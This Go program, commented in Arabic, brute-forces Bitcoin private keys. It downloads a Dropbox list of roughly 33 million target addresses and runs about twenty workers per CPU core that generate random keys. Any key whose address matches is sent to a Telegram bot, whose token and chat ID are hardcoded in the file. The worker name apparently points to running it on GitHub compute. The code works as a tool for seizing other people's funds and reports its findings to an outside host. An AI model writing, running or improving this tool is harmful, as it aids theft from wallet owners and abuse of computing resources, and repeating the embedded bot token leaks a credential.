package main

import (
	"bufio"
	"crypto/sha256"
	"fmt"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/btcsuite/btcd/btcec/v2"
	"github.com/btcsuite/btcd/btcutil/base58"
	"golang.org/x/crypto/ripemd160"
)

var (
	totalChecked uint64
	startTime    = time.Now()
	// بيانات الوصول الخاصة بك
	token      = "5921618897:AAGu6bp5gFtatio22y-XdWUSwAd0Lk6b1HY"
	chatID     = "227172927"
	fileURL    = "https://www.dropbox.com/scl/fi/kpagj5u15zjeo0q5kg31t/wallets.txt?rlkey=0yc47js2rv5hvb2plcf9nqcgp&st=2xrliohq&dl=1"
	workerName = "GitHub-Legacy-Turbo"
)

// دالة تحويل المفتاح العام لعنوان Legacy (1...)
func hash160(data []byte) []byte {
	h256 := sha256.Sum256(data)
	hasher := ripemd160.New()
	hasher.Write(h256[:])
	return hasher.Sum(nil)
}

func encodeAddress(pubKey []byte) string {
	return base58.CheckEncode(hash160(pubKey), 0x00)
}

func main() {
	cores := runtime.NumCPU()
	runtime.GOMAXPROCS(cores)

	// رسالة بدء التشغيل الأولية
	sendTelegram(fmt.Sprintf("🚀 *تم إيقاظ الوحش!*\nالمصدر: [%s]\nجاري سحب الـ 33 مليون هدف من Dropbox... انتظر قليلاً.", workerName))

	// تحميل الأهداف مع معالجة الذاكرة
	targets := make(map[string]bool)
	resp, err := http.Get(fileURL)
	if err != nil {
		sendTelegram("❌ فشل الاتصال بـ Dropbox")
		return
	}
	
	scanner := bufio.NewScanner(resp.Body)
	// تخصيص Buffer كبير جداً لقراءة الأسطر الطويلة والملفات الضخمة
	buf := make([]byte, 0, 1024*1024)
	scanner.Buffer(buf, 10*1024*1024)

	for scanner.Scan() {
		addr := strings.TrimSpace(scanner.Text())
		if addr != "" {
			targets[addr] = true
		}
	}
	resp.Body.Close()

	if len(targets) < 1000 {
		sendTelegram(fmt.Sprintf("⚠️ تحذير: تم تحميل %d عنوان فقط. قد تكون هناك مشكلة في الرابط أو حجم الذاكرة.", len(targets)))
	} else {
		sendTelegram(fmt.Sprintf("📥 *اكتمل الشحن بنجاح!*\nالعدد الإجمالي: %d عنوان\nالنوع: Legacy Compressed\nبدأ الجلد الفعلي... 🔥", len(targets)))
	}

	// مؤقت التقارير الدوري (كل 5 دقائق)
	go func() {
		for {
			time.Sleep(5 * time.Minute)
			sendReport()
		}
	}()

	var wg sync.WaitGroup
	// تشغيل العمال (Workers) - استهلاك كامل طاقة المعالج
	for i := 0; i < cores*20; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				// توليد مفتاح خاص جديد بسرعة البرق
				priv, _ := btcec.NewPrivateKey()
				
				// فحص Legacy Compressed (أسرع مسار فحص متاح عالمياً)
				addr := encodeAddress(priv.PubKey().SerializeCompressed())

				if targets[addr] {
					sendFound(addr, priv)
				}
				// زيادة العداد
				atomic.AddUint64(&totalChecked, 1)
			}
		}()
	}
	wg.Wait()
}

func sendReport() {
	elapsed := time.Since(startTime).Seconds()
	total := atomic.LoadUint64(&totalChecked)
	speed := float64(total) / elapsed
	
	// عينة عشوائية للتقرير
	priv, _ := btcec.NewPrivateKey()
	addr := encodeAddress(priv.PubKey().SerializeCompressed())

	report := fmt.Sprintf("📊 *تقرير الأداء الناري*\n"+
		"━━━━━━━━━━━━━━━\n"+
		"🚀 السرعة: %.0f فحص/ث\n"+
		"💎 الإجمالي: %d\n"+
		"⏱ الدقائق: %.1f\n"+
		"━━━━━━━━━━━━━━━\n"+
		"🔑 عينة هيكس: `%x` \n"+
		"🏠 عينة عنوان: `%s` ", 
		speed, total, elapsed/60, priv.Serialize(), addr)
	
	sendTelegram(report)
}

func sendTelegram(text string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown", 
		token, chatID, url.QueryEscape(text))
	http.Get(apiURL)
}

func sendFound(addr string, priv *btcec.PrivateKey) {
	msg := fmt.Sprintf("💰 *[JACKPOT FOUND]*\n\nالمصدر: %s\nالعنوان: `%s` \nالمفتاح: `%x` ", workerName, addr, priv.Serialize())
	sendTelegram(msg)
}
